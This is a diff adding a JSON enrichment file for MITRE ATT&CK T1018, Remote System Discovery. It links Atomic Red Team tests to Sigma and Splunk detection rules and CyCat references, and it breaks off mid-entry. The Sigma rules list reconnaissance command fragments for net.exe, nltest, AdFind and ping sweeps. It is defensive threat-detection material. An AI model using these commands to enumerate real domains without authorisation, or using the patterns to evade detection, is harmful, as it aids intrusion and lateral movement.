@@ -1,0 +1,926 @@
+{
+    "id": "T1018",
+    "name": "Remote System Discovery",
+    "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](S0097) or `net view` using [Net](S0039). Adversaries may also use local host files (ex: `C:WindowsSystem32Driversetchosts` or `/etc/hosts`) in order to discover the hostname to IP address mappings of remote systems.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Discovery",
+    "data_sources": "Process: Process Creation, Command: Command Execution, Network Traffic: Network Connection Creation, File: File Access",
+    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001).\nMonitor for processes that can be used to discover remote systems, such as `ping.exe` and `tracert.exe`, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
+    "url": "https://attack.mitre.org/techniques/T1018",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "5843529a-5056-4bc1-9c13-a311e2af4ca0",
+                "atomic_attack_name": "Remote System Discovery - net group Domain Controller",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml",
+                        "remote_content": "title: Suspicious Group And Account Reconnaissance Activity Using Net.EXE\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nstatus: test\ndescription: |\n    Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\n    Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\nreferences:\n    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nauthor: Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-03-02\ntags:\n    - attack.discovery\n    - attack.t1087.001\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    # Covers group and localgroup flags\n    selection_group_root:\n        CommandLine|contains:\n            - ' group '\n            - ' localgroup '\n    selection_group_flags:\n        CommandLine|contains:\n            # Add more groups for other languages\n            - 'domain admins'\n            - ' administrator' # Typo without an 'S' so we catch both\n            - ' administrateur' # Typo without an 'S' so we catch both\n            - 'enterprise admins'\n            - 'Exchange Trusted Subsystem'\n            - 'Remote Desktop Users'\n            - 'Utilisateurs du Bureau à distance' # French for \"Remote Desktop Users\"\n            - 'Usuarios de escritorio remoto' # Spanish for \"Remote Desktop Users\"\n            - ' /do' # short for domain\n    filter_group_add:\n        # This filter is added to avoid the potential case where the point is not recon but addition\n        CommandLine|contains: ' /add'\n    # Covers 'accounts' flag\n    selection_accounts_root:\n        CommandLine|contains: ' accounts '\n    selection_accounts_flags:\n        CommandLine|contains: ' /do' # short for domain\n    condition: selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)\nfalsepositives:\n    - Inventory tool runs\n    - Administrative activity\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Domain Group Discovery With Net",
+                        "rule_link": "https://research.splunk.com/endpoint/f2f14ac7-fa81-471a-80d5-7eb65c3c7349/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad",
+                "atomic_attack_name": "Get-WmiObject to Enumerate Domain Controllers",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "GetWmiObject Ds Computer with PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/7141122c-3bc2-4aaa-ab3b-7a85a0bbefc3/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf",
+                "atomic_attack_name": "Enumerate Active Directory Computers with Get-AdComputer",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "GetAdComputer with PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/c5a31f80-5888-4d81-9f78-1cc65026316e/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "a889f5be-2d54-4050-bd05-884578748bb4",
+                "atomic_attack_name": "Adfind - Enumerate Active Directory Computer Objects",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - AdFind Suspicious Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
+                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows AdFind Exe",
+                        "rule_link": "https://research.splunk.com/endpoint/bd3b0187-189b-46c0-be45-f52da2bae67f/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8",
+                "atomic_attack_name": "Remote System Discovery - nltest",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Recon Activity Via Nltest.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml",
+                        "remote_content": "title: Potential Recon Activity Via Nltest.EXE\nid: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\nrelated:\n    - id: 410ad193-a728-4107-bc79-4419789fcbf8\n      type: similar\n    - id: 903076ff-f442-475a-b667-4f246bcc203b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)\n    - https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/\n    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n    - https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html\n    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n    - https://github.com/redcanaryco/atomic-red-team/blob/5360c9d9ffa3b25f6495f7a16e267b719eba2c37/atomics/T1482/T1482.md#atomic-test-2---windows---discover-domain-trusts-with-nltest\nauthor: Craig Young, oscd.community, Georg Lauenstein\ndate: 2021-07-24\nmodified: 2023-12-15\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_nltest:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    selection_recon:\n        - CommandLine|contains|all:\n              - 'server'\n              - 'query'\n        - CommandLine|contains:\n              - '/user'\n              - 'all_trusts' # Flag for /domain_trusts\n              - 'dclist:'\n              - 'dnsgetdc:'\n              - 'domain_trusts'\n              - 'dsgetdc:'\n              - 'parentdomain'\n              - 'trusted_domains'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use but user and host must be investigated\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Nltest.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_execution.yml",
+                        "remote_content": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Domain Controller Discovery with Nltest",
+                        "rule_link": "https://research.splunk.com/endpoint/41243735-89a7-4c83-bcdd-570aa78f00a1/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f",
+                "atomic_attack_name": "Remote System Discovery - net group Domain Computers",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml",
+                        "remote_content": "title: Suspicious Group And Account Reconnaissance Activity Using Net.EXE\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nstatus: test\ndescription: |\n    Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\n    Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\nreferences:\n    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nauthor: Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-03-02\ntags:\n    - attack.discovery\n    - attack.t1087.001\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    # Covers group and localgroup flags\n    selection_group_root:\n        CommandLine|contains:\n            - ' group '\n            - ' localgroup '\n    selection_group_flags:\n        CommandLine|contains:\n            # Add more groups for other languages\n            - 'domain admins'\n            - ' administrator' # Typo without an 'S' so we catch both\n            - ' administrateur' # Typo without an 'S' so we catch both\n            - 'enterprise admins'\n            - 'Exchange Trusted Subsystem'\n            - 'Remote Desktop Users'\n            - 'Utilisateurs du Bureau à distance' # French for \"Remote Desktop Users\"\n            - 'Usuarios de escritorio remoto' # Spanish for \"Remote Desktop Users\"\n            - ' /do' # short for domain\n    filter_group_add:\n        # This filter is added to avoid the potential case where the point is not recon but addition\n        CommandLine|contains: ' /add'\n    # Covers 'accounts' flag\n    selection_accounts_root:\n        CommandLine|contains: ' accounts '\n    selection_accounts_flags:\n        CommandLine|contains: ' /do' # short for domain\n    condition: selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)\nfalsepositives:\n    - Inventory tool runs\n    - Administrative activity\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Domain Group Discovery With Net",
+                        "rule_link": "https://research.splunk.com/endpoint/f2f14ac7-fa81-471a-80d5-7eb65c3c7349/"
+                    },
+                    {
+                        "rule_name": "Remote System Discovery with Net",
+                        "rule_link": "https://research.splunk.com/endpoint/9df16706-04a2-41e2-bbfe-9b38b34409d3/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "85321a9c-897f-4a60-9f20-29788e50bccd",
+                "atomic_attack_name": "Remote System Discovery - net",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Share And Session Enumeration Using Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_view_share_and_sessions_enum.yml",
+                        "remote_content": "title: Share And Session Enumeration Using Net.EXE\nid: 62510e69-616b-4078-b371-847da438cc03\nstatus: stable\ndescription: Detects attempts to enumerate file shares, printer shares and sessions using \"net.exe\" with the \"view\" flag.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nauthor: Endgame, JHasenbusch (ported for oscd.community)\ndate: 2018-10-30\nmodified: 2023-02-21\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains: 'view'\n    filter:\n        CommandLine|contains: '\\\\\\\\'\n    condition: all of selection_* and not filter\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of net.exe utility by legitimate user\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Remote System Discovery with Net",
+                        "rule_link": "https://research.splunk.com/endpoint/9df16706-04a2-41e2-bbfe-9b38b34409d3/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "b8147c9a-84db-4ec1-8eee-4e0da75f0de5",
+                "atomic_attack_name": "Enumerate Remote Hosts with Netscan",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Use Short Name Path in Command Line",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
+                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d",
+                "atomic_attack_name": "Enumerate Active Directory Computers with ADSISearcher",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - AdFind Suspicious Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
+                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1018",
+                "atomic_attack_guid": "6db1f57f-d1d5-4223-8a66-55c9c65a9592",
+                "atomic_attack_name": "Remote System Discovery - ping sweep",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Scan Loop Network",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_network_scan_loop.yml",
+                        "remote_content": "title: Suspicious Scan Loop Network\nid: f8ad2e2c-40b6-4117-84d7-20b89896ab23\nstatus: test\ndescription: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\n    - https://ss64.com/nt/for.html\n    - https://ss64.com/ps/foreach-object.html\nauthor: frack113\ndate: 2022-03-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_loop:\n        CommandLine|contains:\n            - 'for '\n            - 'foreach '\n    selection_tools:\n        CommandLine|contains:\n            - 'nslookup'\n            - 'ping'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "0319b483-5973-4932-91ea-5a44c2975b24",
+                    "1f6399cf-2c80-4924-ace1-6fcff3393480",
+                    "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                    "e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+                    "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "9a132afa-654e-11eb-ae93-0242ac130002",
+                    "bed2a484-9348-4143-8a8a-b801c979301c",
+                    "10227522-8429-47e6-a301-f2b2d014e7ad",
+                    "36bed6b2-e9a0-4fff-beeb-413a92b86138",
+                    "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
+                    "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                    "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                    "f8ad2e2c-40b6-4117-84d7-20b89896ab23",
+                    "11063ec2-de63-4153-935e-b1a8b9e616f1",
+                    "62510e69-616b-4078-b371-847da438cc03",
+                    "9a902722-cecd-4fbe-a6c9-49333aa0f8c2",
+                    "fa3c117a-bc0d-416e-a31b-0c0e80653efb",
+                    "9705a6a1-6db6-4a16-a987-15b7151e299b",
+                    "4ebc877f-4612-45cb-b3a5-8e3834db36c9",
+                    "75df3b17-8bcc-4565-b89b-c9898acef911",
+                    "5e55be1a-3a30-48ae-9934-4199950d210f",
+                    "26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160",
+                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                        "lookup_data": {
+                            "description": "Conti Ransomware",
+                            "link": "http://www.botvrij.eu/data/feed-osint/0319b483-5973-4932-91ea-5a44c2975b24.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1621181463",
+                            "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1f6399cf-2c80-4924-ace1-6fcff3393480",
+                        "lookup_data": {
+                            "description": "Enumerates Active Directory to determine computers that are joined to the domain",
+                            "raw": "author: frack113\ndate: 2022/02/12\ndescription: Enumerates Active Directory to determine computers that are joined to\n  the domain\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - 'New-Object '\n    - System.DirectoryServices.DirectorySearcher\n    - .PropertiesToLoad.Add\n    - .findall()\n    - Properties.name\nfalsepositives:\n- Unknown\nid: 1f6399cf-2c80-4924-ace1-6fcff3393480\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-15---enumerate-domain-computers-within-active-directory-using-directorysearcher\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\ntitle: DirectorySearcher Powershell Exploitation\n",
+                            "sigma:id": "1f6399cf-2c80-4924-ace1-6fcff3393480",
+                            "title": "DirectorySearcher Powershell Exploitation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                        "lookup_data": {
+                            "description": "SectorJ04 Groupâ€™s Increased Activity in 2019",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d6e7aa3-aca4-46cc-b96a-46ac950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1568039252",
